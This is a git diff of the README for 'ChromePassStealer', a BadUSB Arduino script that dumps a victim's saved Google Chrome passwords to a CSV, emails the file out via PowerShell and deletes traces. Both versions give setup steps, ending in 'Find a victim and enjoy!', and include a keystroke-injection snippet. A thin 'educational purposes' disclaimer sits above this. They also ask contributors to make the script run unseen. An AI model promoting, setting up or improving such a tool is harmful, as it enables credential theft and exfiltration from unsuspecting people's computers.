@@ -1,47 +1,50 @@
-# chromePassStealer 🥷
-This project allows you to steal passwords from **Google Chrome** and get all the data by mail.
-# This project isn't updated, if you want a better script click [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer)
-# Warning ⚠️
-Everything in this repository is **strictly** for educational purposes. Notice **I am not responsible** for stolen data. **You are responsible** for your actions using developed script for **BadUSB**
-# About ℹ️
-Most people who are not well informed about **computer science** save their **passwords** on **Google Chrome** for convenience. This script uses these **weaknesses** to **steal** all **passwords** saved by **Google Chrome** users. The script makes your **BadUSB** disable **Windows** **passwords** by powershell command line, then it opens **Google Chrome** and download a **.csv** file with all **Chrome passwords** by **Windows shortcuts**. Once this file is downloaded, the **BadUSB** send this file by **mail** from powershell command line. To end up the script delete **.csv** file and close **Google Chrome** and powershell.
-### NB n°1
-Sometimes, you will see something like this : 
-``` 
+# 🥷 ChromePassStealer  
+🚨 **This project is no longer updated.** If you want a better script, click [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer).  
+## ⚠️ Warning  
+Everything in this repository is **strictly** for educational purposes. **I am not responsible** for any stolen data. **You are responsible** for your actions when using this script with **BadUSB**.  
+## ℹ️ About  
+Many people who are not well-informed about **cybersecurity** save their **passwords** in **Google Chrome** for convenience. This script **exploits** this weakness to **steal** all saved passwords.  
+### 🛠️ How it works:  
+1️⃣ **Disables Windows password** using PowerShell.  
+2️⃣ **Opens Google Chrome** and downloads a **.csv file** containing all saved passwords.  
+3️⃣ **Sends the file by email** via PowerShell.  
+4️⃣ **Deletes traces** by removing the file and closing Chrome.  
+## 🔑 Key Information for Users  
+### 🎹 Important Note #1 – Keyboard Layout Adaptation  
+Sometimes, you might see this in the code:  
+```arduino
 Keyboard.press(KEY_LEFT_CTRL);
 Keyboard.press(KEY_LEFT_ALT);
 Keyboard.press(173);
-Keyboard.releaseAll(); 
+Keyboard.releaseAll();
 ```
-This is only to write these characters : "@", "\\". But it depends on the computer's layout, so adapt these characters thanks to this [site](https://www.csee.umbc.edu/portal/help/theory/ascii.txt) and the sequence you actually use to wirte these characters with your keyboard. (or switch the keyboard layout to French)
-### NB n°2
-When the script is executed the person who plugged **BadUsb** see his computer working alone so this script isn't optimized yet.
-### NB n°3
-You can customize the **delay** according to the speed in which you plug the **BadUSB**.
-# Getting Started ✔️
-## Requirments
-1. Have a **BadUSB**
-
-2. Install **Arduino software** [here](https://www.arduino.cc/en/software).
-
-2. Have a **Gmail** account and enable **less secure app** [here](https://www.google.com/settings/security/lesssecureapps).
-## Install
-1. Download this repository
-
-**Linux :**
-```
+This is used to type characters like `@` or `\`, but it depends on the **keyboard layout**. 👉 **Adapt these characters** using this [ASCII table](https://www.csee.umbc.edu/portal/help/theory/ascii.txt) or simply **switch the keyboard layout to French**.  
+### 👀 Important Note #2 – Visibility Issue  
+⚠️ The script **is not yet optimized** for stealth. The victim **can see** their computer acting on its own.  
+### 🕒 Important Note #3 – Adjusting Delay  
+You can **customize the delay** based on how fast you plug in the **BadUSB**.  
+## 🚀 Getting Started  
+## 📌 Requirements  
+✔️ A **BadUSB**  
+✔️ Install **Arduino software** [here](https://www.arduino.cc/en/software)  
+✔️ A **Gmail** account with **"Less Secure Apps"** enabled [here](https://www.google.com/settings/security/lesssecureapps) *(if required)*  
+## ⚙️ Installation  
+1️⃣ **Download this repository**  
+🔹 **Linux:**  
+```bash
 git clone https://github.com/tuconnaisyouknow/ChromePassStealer
 cd ChromePassStealer
-```
-**Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.
-
-2. Replace your mail and password [here](https://github.com/tuconnaisyouknow/ChromePassStealer/blob/main/ChromePassStealer.txt) or [here](https://github.com/tuconnaisyouknow/ChromePassStealer/blob/main/ChromePassStealer.ino) at line 238, 245, 253, 264
-
-3. Add your code in the **BadUSB** by **Arduino software**
-
-4. Find a victim and enjoy !
-## Requirments for victim PC
-* Turn off caps lock
-* Switch the keyboard layout to French (or adapt the code according to your layout)
-# Help Me ⛑️
-If you want to help me, I want to make the script run in background and do all it do from Chrome directly from powershell. Thanks to your contribution !
+```  
+🔹 **Windows:**  
+- Click the **green "Code" button** at the top right.  
+- Click **"Download ZIP"** and extract it.  
+2️⃣ **Replace your email and password** in:  
+- [`ChromePassStealer.ino`](https://github.com/tuconnaisyouknow/ChromePassStealer/blob/main/ChromePassStealer.ino)  
+*(Lines 238, 245, 253, 264)*  
+3️⃣ **Upload the script to your BadUSB** using **Arduino software**.  
+4️⃣ **Find a victim and enjoy!** 🎭  
+## 🖥️ Requirements for the Victim's PC  
+✔️ **Turn off Caps Lock**  
+✔️ **Switch the keyboard layout to French** *(or adapt the code accordingly)*  
+## 🆘 Help Me ⛑️  
+I want to **make the script run in the background** and perform all actions from **Chrome directly via PowerShell**. If you have any ideas, feel free to contribute! 🚀  
